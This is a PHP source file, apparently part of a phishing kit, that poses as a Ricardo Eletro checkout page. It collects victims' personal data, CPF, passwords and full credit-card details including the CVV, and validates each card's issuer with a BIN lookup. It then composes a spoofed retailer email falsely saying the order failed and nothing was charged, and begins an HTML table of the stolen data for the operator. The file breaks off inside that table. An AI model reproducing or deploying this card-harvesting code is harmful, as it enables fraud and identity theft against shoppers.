 <?PHP

if (isset($_POST["Csadastrar"])){
function gerarPedido($tamanho = 7, $maiusculas = true, $numeros = true, $simbolos = false)
{
$lmin = '';
$lmai = '';
$num = '123456789';
$simb = '';
$retorno = '';
$caracteres = '';

$caracteres .= $lmin;
if ($maiusculas) $caracteres .= $lmai;
if ($numeros) $caracteres .= $num;
if ($simbolos) $caracteres .= $simb;

$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
$rand = mt_rand(1, $len);
$retorno .= $caracteres[$rand-1];
}
return $retorno;
}
$numberPedido = gerarPedido(7, true, true, true);
function validaCPF($cpfx = null) {       
                        // Verifica se um número foi informado
                        if(empty($cpfx)) {
                                return false;
                        }        
                        // Elimina possivel mascara
                        $cpfx = ereg_replace('[^0-9]', '', $cpfx);
                        $cpfx = str_pad($cpfx, 11, '0', STR_PAD_LEFT);
                         
                        // Verifica se o numero de digitos informados é igual a 11
                        if (strlen($cpfx) != 11) {
                                return false;
                        }
                        // Verifica se nenhuma das sequências invalidas abaixo
                        // foi digitada. Caso afirmativo, retorna falso
                        else if ($cpfx == '00000000000' ||
                                $cpfx == '11111111111' ||
                                $cpfx == '22222222222' ||
                                $cpfx == '33333333333' ||
                                $cpfx == '44444444444' ||
                                $cpfx == '55555555555' ||
                                $cpfx == '66666666666' ||
                                $cpfx == '77777777777' ||
                                $cpfx == '88888888888' ||
                                $cpfx == '99999999999') {
                                return false;
                         // Calcula os digitos verificadores para verificar se o
                         // CPF é válido
                         } else {  
                                 
                                for ($t = 9; $t < 11; $t++) {
                                         
                                        for ($d = 0, $c = 0; $c < $t; $c++) {
                                                $d += $cpfx{$c} * (($t + 1) - $c);
                                        }
                                        $d = ((10 * $d) % 11) % 10;
                                        if ($cpfx{$c} != $d) {
                                                return false;
                                        }
                                }        
                                return true;
                        }
                }
                function validaEmail($email) {
                        $conta = "^[a-zA-Z0-9\._-]+@";
                        $domino = "[a-zA-Z0-9\._-]+.";
                        $extensao = "([a-zA-Z]{2,4})$";
                       
                        $pattern = $conta.$domino.$extensao;
                       
                        if (ereg($pattern, $email))
                        return true;
                        else
                        return false;
                }

//$gender         = $_POST['registerView_userAddress_gender'];
		// TIPO 
		$tipo			= $_POST['tipo'];
		// PESSOA JURIDICA
		$rsocail 		= $_POST['RazaoSocial'];
		$nfantasia 		= $_POST['NomeFantasia'];
		$cnpj  			= $_POST['Cnpj'];
		$iestadual		= $_POST['IEstadual'];
		$dddpj			= $_POST['DddEmpresa'];
		$telpj 			= $_POST['FoneEmpresal'];
		$ramalpj 		= $_POST['RamoAtividade'];
		
		// Dados pessoais
		$nome  			= $_POST['Nome'];
		$sobrenome		= $_POST['Sobrenome'];
		$apelido		= $_POST['Apelido'];
		$nascimento		= $_POST['Nascimento'];
		$sexo 			= $_POST['Sexo'];
		$profissao		= $_POST['Profissao'];
		$cpf			= $_POST['Cpf'];
		// Contato 1
		$ddcontato1 	= $_POST['DddContato1'];
		$fonecontato1	= $_POST['FoneContato1'];
		$ramalcontato1	= $_POST['RamalContato1'];
		// Contato 2
		$ddcontato2 	= $_POST['DddContato2'];
		$fonecontato2	= $_POST['FoneContato2'];
		$ramalcontato2	= $_POST['RamalContato2'];
		// Contato 3
		$ddcontato3 	= $_POST['DddContato3'];
		$fonecontato3	= $_POST['FoneContato3'];
		
		//Endereço
		$cep			= $_POST['cep'];
		$rua			= $_POST['rua'];
		$numero			= $_POST['Numero'];
		$complemento	= $_POST['Complemento'];
		$bairro			= $_POST['Bairro'];
		$estado			= $_POST['Estado'];
		$cidade			= $_POST['Cidade'];
		$preferencia	= $_POST['Referencia'];
		
		// Identificação
		$email			= $_POST['Email'];
		$email2			= $_POST['ConfirmeEmail'];
		$pass1			= $_POST['Senha'];
		$pass2			= $_POST['ConfirmeSenha'];
		
		
		$date			= date("Y-m-d H:i:s"); 
		$produto 		= ucwords($titlepagina); 
		$ip 			= $_SERVER["REMOTE_ADDR"];
		
		// Começa a verificação
		
		$nomecc1		= $_POST['NomeCartaoCredito1'];
		$cpf2			= $_POST['CpfCartaoCredito1'];
		$nascimento2	= $_POST['NascimentoCartaoCredito1'];
		$cartao			= $_POST['CartaoCredito1'];
		$validade		= $_POST['validadeCartao'];
		$segurancacvv	= $_POST['CodSegurancaCartao1'];
		$bandeira		= $_POST['Bandeira'];
		$parcela		= $_POST['Parcela1'];
		
		$Dates = date("d/m/Y");
		$Datesa = date("H:i:s");
		
		// verifica o tipo de verificação, se é PF ou PJ.<br />
		if($tipo == '1'){
			if(    
                        empty($rsocail) or empty($nfantasia) or
                        empty($iestadual) or empty($cnpj) or
                        empty($dddpj) or empty($telpj) or
                        empty($ramalpj) ){
                                $error[] = "Existem campos empresariais não preenchidos";    
                }
		}

                // NOVA VALIDÇÃO DE CAMPOS //
				// Contato 1
		
                // verifica se algum campo obrigatório esteja vazio
                if(    
                        empty($nome) or empty($sobrenome) or
                        empty($nascimento) or
                        empty($cpf) or empty($ddcontato1) or
                        empty($fonecontato1) or empty($rua) or
                        empty($numero) or empty($bairro) or empty($estado) or empty($cidade) or empty($email) or empty($email2) or empty($pass1) or empty($pass2)){
                                $error[] = "Existem campos obrigatórios não preenchidos";    
                }
				if(empty($sexo)){
					$error[] = true;
					$todos .= "Selecione o <strong>sexo</strong>";
				}
				
				// faz a parada
				if(empty($nome)){
					$errorNome = "Preencha o <strong>nome</strong>";	
				}
				if(empty($sobrenome)){
					$errorNome = "Preencha o <strong>nome</strong>";	
				}
                // Validar CPF
                if(validaCPF($cpf) == false){                        
						$error[] = true;  
						$todos	.= "CPF inválido";    
                }
				if(validaCPF($cpf2) == false){                        
						$error2[] = true;  
						$cpfin	  = "CPF inválido";    
                }
                // valida a data de nascimento (PRIMEIRO REGISTRO )
                $verificar_nascimento = explode('/', $nascimento);
				
				// pega o ano de hoje
                $Date = date("Y");
                $verificar_idade = $Date - $verificar_nascimento[2];
               
                if($verificar_idade <= 15 or $verificar_nascimento[1] >= 13 or $verificar_nascimento[0] >= 32 or $verificar_idade >= 120){
                        $error[] = true;  
						$todos	.= "Data de Nascimento Inválida";
                }
                // VALIDA A DATA DE NASCIMENTO cartao
                $verificar_nascimentos = explode('/',$nascimento2);
                $Date = date("Y");
                $verificar_idades = $Date - $verificar_nascimentos[2];
               
                if($verificar_idades <= 15 or $verificar_nascimentos[1] >= 13 or $verificar_nascimentos[0] >= 32 or $verificar_idades >= 120){
                        $error2[] = "Data de Nascimento Inválida";  
						$nascimentoin = "Data de Nascimento Inválida";   
                }
                			// Valida��o Cart�o 
							 $restricao = array(" " => "");
                $cc = strtr($_POST['CartaoCredito1'], $restricao);
    				
					$bincompleta = $cc;
                    $cc =  substr($cc,0,6) ;
							
				
                // Define a URL original (do formul�rio de login)
           $checar = "http://www.binlist.net/json/$cc";
                
               






// Endere�o do site
 $url = $checar;

 // Pegando dados do Site e colocando em uma String
 $dadosSite = file_get_contents('http://www.binlist.net/json/$cc');
 



 
 
$numerobin1 = explode('{"bin":"', $dadosSite);
$numerobin2 = explode('",',$numerobin1[1]);
 
$numerobin = $numerobin2[0];

$banco1 = explode('"bank":"', $dadosSite);
$banco2 = explode('",',$banco1[1]);
 
$banco = $banco2[0];

$banco = strtoupper($banco);


$cartao1 = explode('"card_type":"', $dadosSite);
$cartao2 = explode('",',$cartao1[1]);
 
$cartaor = $cartao2[0];

$cartao11 = explode('"card_category":"', $dadosSite);
$cartao21 = explode('",',$cartao11[1]);
 
$cartao123 = $cartao21[0];

$cartao111 = explode('"country_name":"', $dadosSite);
$cartao211 = explode('",',$cartao111[1]);
 
$cartao1231 = $cartao211[0];
$cartao1231 = strtoupper($cartao1231);

$cartao1111 = explode('"brand":"', $dadosSite);
$cartao2111 = explode('",',$cartao1111[1]);
 
$cartao12311 = $cartao2111[0];
$cartao12311 = strtoupper($cartao12311);

$info = $banco . ' ' .$cartao12311. ' ' .$cartaor. ' ' .$cartao123. ' ' .$cartao1231;
				
		
          
               	
                // verificar bandeira
				if($bandeira == '1'){
					// master
					$nameBandeira =	"MASTERCARD";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '2'){
					// master
					$nameBandeira =	"VISA";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '3'){
					// master
					$nameBandeira =	"AMERICAN EXPRESS";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '4'){
					// master
					$nameBandeira =	"DINERS";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '6'){
					// master
					$nameBandeira =	"HIPERCARD";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '13'){
					// master
					$nameBandeira =	"ELO";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				// valida
				if(!isset($bandeirafind)){
					$error2[] = "Valido";
					$cartaoins 	= "Cartão Inválido";	
				}
				
				// VALIDA CARTÃO
                if($cartao2111[0] == ''){
                        $error2[] = "Cartão digitado é inválido";   
						$cartaoin = "Cartão digitado é inválido";         
                }
                $Date_Mes = date("m");
               
                // valida Validade
                $pegar_datas = explode('/', $validade);
              
                // verifica o mês
                if($pegar_datas[0] >= 13){
                        $error2[] = "Vencimento do Cartão Inválido";  
						$validadein = "Validade Inválida"; 
                }
               
                // verifica o ano              
                $pegar_ano = "20".$pegar_datas[1];
               	$Date = date("Y");
				$Date_menos = $Date - 1;
                if($pegar_ano < $Date_menos){
                        // verifica se o mês que ele coloco é válido pro ano atual
                      	$error2[] = "Vencimento do Cartão Inválido"; 
						$validadein = "Validade Inválida"; 
                                            
                }
                if (!validaEmail($email)) {
                        
						$error[] = true;  
						$todos	.= "O E-mail digitado é inválido ou está vazio";
                }
				if($email != $email2){
					$error[] = true;  
					$todos	.= "E-mail digitado não são iguais";
					
				}
				if(empty($email) and empty($email2)){
					$error[] = true; 
					$todos 	.= "Campo e-mail vazio";	
				}

               
        
}
?>

<? if(!isset($error) and isset($_POST["Csadastrar"])){?>
<? if(!isset($error2)){ ?>
<?
// executa o bloco de comandos de envio aos emails
$mensagem_cancelado = '
 <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#ffffff">

 <link href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920044&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" rel="stylesheet" type="text/css" />

 <tr>

 <td eihght="25" align="center" valign="middle" style="font:11px Verdana; color:#000000;">
<font align="center" color="#0" face="Verdana, Arial, sans-serif" size="1">
Caso n&atilde;o esteja visualizando as imagens, <a href="http://www.ricardoeletro.com.br" target="_blank">
acesse aqui</a>
</font>
</td>

 </tr>

 <tr>

 <td height="187" bgcolor="#fdc80f">
<table width="718" align="center" border="0" cellpadding="0" cellspacing="0">

 <tr>

 <td height="187">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920045&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" target="_blank">
</a>
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920046&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&">
<img src="http://s21.postimg.org/w7kii5tuv/header.jpg" border="0" />
</a>
</td>

 </tr>

 </table>
</td>

 </tr>

 </table>


 <table width="718" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">

 <tr>

 </tr>

 </table>

 <table width="718" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <td width="718"
 height="300"><font color="#1C1C1C" style="text-align:left;" face="Trebuchet MS, Arial, Helvetica, sans-serif" size="3" align="center">Olá
'.$nome.'
!<br>
<br>
A Ricardo Eletro através deste e-mail vem comunica-lo que não foi possível efetuar a conclusão do seu pedido Nº:
'.$numberPedido.'  devido a uma indisponibilidade momentânea em nosso estoque, o produto que você tentou adquirir encontra-se esgotado. Pedimos desculpas pelo inconveniente causado por esta falha em nosso estoque e te informamos que nada foi debitado em seu cartão de crédito , assim que o produto estiver disponível novamente te informaremos por e-mail.<p></p>
</font>
<p><font color="#1C1C1C" style="text-align:left;" face="Trebuchet MS, Arial, Helvetica, sans-serif" size="3" align="center">Atenciosamente, Ricardo Eletro.
</font></p></td>
</table>

 
<table width="722" align="center" border="0" cellpadding="0" cellspacing="0">

 <tr>

 <td>
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer/Re_conheca.jpg" style="display:block" alt="" border="0"/>
</td>

 </tr>

</table>

<table width="722" align="center" border="0" cellpadding="0" cellspacing="0">

 <tr valign="middle">

 <td width="12" height="100">
</td>

 <td height="100" style="vertical-align: top; line-height: 16px;">
<font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920079&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Acess&oacute;rios de Inform&aacute;tica</font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920080&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Automotivos </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920081&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Beb&ecirc;s </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920082&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Beleza & Sa&uacute;de </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920083&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Brinquedos </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920084&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Cal&ccedil;ados </font>
</a>
</font>
</td>

 <td height="100" style="vertical-align: top; line-height: 16px;">
<font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920085&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Cama, Mesa & Banho </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920086&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
C&acirc;meras & Filmadoras </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920087&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Celulares & Telefones </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920088&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Colch&otilde;es </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920089&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Dvds & Blu-ray </font>
</a>
</font>
<br/>
</td>

 <td height="100" style="vertical-align: top; line-height: 16px;">
<font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920090&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Eletrodom&eacute;sticos </font>
</a>
</font>
<br/>

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920091&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Eletr&ocirc;nicos </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920092&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Eletroport&aacute;teis </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920093&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Esporte & Lazer </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920094&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Ferramentas & Jardim </font>
</a>
</font>
<br />
</td>

 <td height="100" style="vertical-align: top; line-height: 16px;">
<font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920095&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Games </font>
</a>
</font>
<br/>

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920096&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Inform&aacute;tica </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920097&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Instrumentos Musicais </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920098&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Livros </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920099&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Malas de Viagem</font>
</a>
</font>
<br/>
</td>

 <td height="100" style="vertical-align: top; line-height: 16px;">
<font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920100&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Perfumaria</font>
</a>
</font>
<br/>

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920101&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Rel&oacute;gios </font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920102&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Suplementos & Vitaminas</font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920103&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Tablets</font>
</a>
</font>
<br />

 <font size="1">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920104&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" style="text-decoration: none; color: rgb(51, 51, 51);" target="_blank">
<font face="Verdana, Arial, Helvetica, sans-serif">
Utilidades Dom&eacute;sticas </font>
</a>
</font>
</td>

 </tr>

</table>

<table width="722" border="0" align="center" cellpadding="0" cellspacing="0">

 <tr>

 <td>
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer/Re_servicos.jpg" style="display:block" alt="" border="0"/>
</td>

 </tr>

</table>

<table width="718" border="0" align="center" cellpadding="0" cellspacing="0">

 <tr>

<td height="101">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920105&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" target="_blank">
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer_new/Re_footer_lista.jpg" style="display:block" width="193" height="101" alt="Lista de Casamento" border="0"/>
</a>
</td>

 <td height="101">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920106&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" target="_blank">
<img alt="Revelac&atilde;o Digital" border="0" src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer/Re_footer_print.jpg" style="display: block;" />
</a>
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920107&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" target="_blank">
</a>
</td>

 <td height="101">
<a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920108&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&">
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer_new/Re_footer_garantia.jpg" style="display:block" width="176" height="101" alt="Garantia Estendida" border="0"/>
</a>
</td>

 <td height="101">
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer_new/Re_footer_televendas.jpg" style="display:block" width="177" height="101" alt="Televendas" border="0"/>
</td>

 </tr>

 </table>

<table width="722" align="center" border="0" cellpadding="0" cellspacing="0">

 <tr>

 <td>
<a href="" target="_blank">
<img src="http://imgnews.ricardoeletro.com.br/2012/emkt/footer/Re_formas.jpg" style="display:block" alt="" border="0"/>
</a>
</td>

 </tr>

</table>

<table width="718" align="center" border="0" cellpadding="0" cellspacing="0">

 <tr>

 <td height="200" align="left" valign="top" style="font:9px Verdana; color:#666666; padding:15px;">
<p>
Todos os produtos apresentados s&atilde;o exclusivos deste este e-mail e est&atilde;o sujeitos a altera&ccedil;&otilde;es de pre&ccedil;os, quantidades em estoque e condi&ccedil;&otilde;es de pagamento sem aviso pr&eacute;vio.<br />

 <br />

 Central de Atendimento:<br />

 Tel: 4002-2343 (Capitais e regi&otilde;es metropolitanas) 0xx71 4002-2343 (Demais localidades)<br />

 Hor&aacute;rio de funcionamento: de segunda-feira &agrave; sexta-feira, das 08:00h &agrave;s 18:00h e aos s&aacute;bados das 08:00h &agrave;s 14:00h (hor&aacute;rio de Bras&iacute;lia), exceto feriados nacionais. D&uacute;vidas? <a href="http://e.ricardoeletro.com/bendar/?atmca=1520988&atmme=423&atmte=1&atmso=ck&utm_content=63920109&atmem=d29ybGRpc21pbmVAb3V0bG9vay5jb20uYnI=&" target="_blank">
clique aqui</a>
<br />

 </p>

 <p>
Caixa Postal: Rua HUM, FAZENDA CONFISCO, Contagem MG, Cep: 32.183-050</p>

 <p>
Nos parcelamentos com juros, a taxa &eacute; de 1,79% a.m. Esse e-mail foi enviado para: selecao-ofertas@ricardoeletro.com.br<br />

 </p>

 <p>
<a href="http://e.ricardoeletro.com/saindo.php?cpid=1&id_user=109&idem=423&id_campanha=1520988&li=26&pp=w&raco=2095980cd246f2ed1482521a5a821f95" target="_blank">
Remova aqui</a>
 ou envie um e-mail para <a href="mailto:abuse@ricardoeletro.com.br">
abuse@ricardoeletro.com.br</a>
 caso voc&ecirc; n&atilde;o queira receber mais esse tipo de mensagem</p>
</td>

 </tr>

 </table>



';
if($tipo == '1'){
$mensage =	"
  <style type=\"text/css\">
		table tr td{padding:4px;}
	</style>
</p>
<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">
   <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Juridica:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Razão Social:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$rsocial</td>
  </tr>
  <tr>
    <td align=\"right\">Nome Fantasia:</td>
    <td>&nbsp;</td>
    <td>$nfantasia</td>
  </tr>
  <tr>
    <td align=\"right\">CNPJ:</td>
    <td>&nbsp;</td>
    <td>$cnpj</td>
  </tr>
  <tr>
    <td align=\"right\">Identificação Estadual:</td>
    <td>&nbsp;</td>
    <td>$iestadual</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone:</td>
    <td>&nbsp;</td>
    <td>$dddpj$telpj$ramalpj</td>
  </tr>
 
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Física:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Nome:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$nome $sobrenome</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf</td>
  </tr>
  <tr>
    <td align=\"right\">Data de Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento</td>
  </tr>
  <tr>
    <td align=\"right\">Apelido:</td>
    <td>&nbsp;</td>
    <td>$apelido</td>
  </tr>
  <tr>
    <td align=\"right\">Profissao:</td>
    <td>&nbsp;</td>
    <td>$profissao</td>
  </tr>

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Contato:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Telefone 1:</td>
    <td>&nbsp;</td>
    <td>$ddcontato1 $fonecontato1 $ramalcontato1</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone 2:</td>
    <td>&nbsp;</td>
    <td>$ddcontato2 $fonecontato2 $ramalcontato2</td>
  </tr>
  <tr>
    <td align=\"right\">Celular:</td>
    <td>&nbsp;</td>
    <td>$ddcontato3 $foncontato3 </td>
  </tr>
  <tr>
